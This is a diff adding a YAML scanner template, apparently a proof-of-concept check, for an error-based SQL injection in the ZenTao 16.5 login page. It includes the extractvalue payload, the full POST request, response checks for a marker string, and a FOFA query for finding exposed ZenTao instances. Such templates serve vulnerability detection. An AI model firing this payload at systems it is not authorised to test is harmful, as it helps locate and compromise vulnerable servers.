@@ -1,0 +1,31 @@
+info:
+  vulId: zentao_16.5_sqli
+  detail: 禅道16.5 sql报错注入漏洞
+  fofaQuery: app="易软天创-禅道系统"
+rules:
+  - request:
+      payload:
+        - "\' and (select extractvalue(1,concat(0x7e,(\\\"9527123456789\\\"),0x7e)))#"
+      path: "{{rootUrl}}/zentao/user-login.html"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Referer: "{{rootUrl}}/zentao/user-login.html"
+        Content-type: application/x-www-form-urlencoded
+        Accept: application/json, text/javascript, */*; q=0.01
+      redirect: false
+      dataTtpe: text
+      data: "account=admin{{payload}}"
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 9527123456789
+          - XPATH syntax error
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
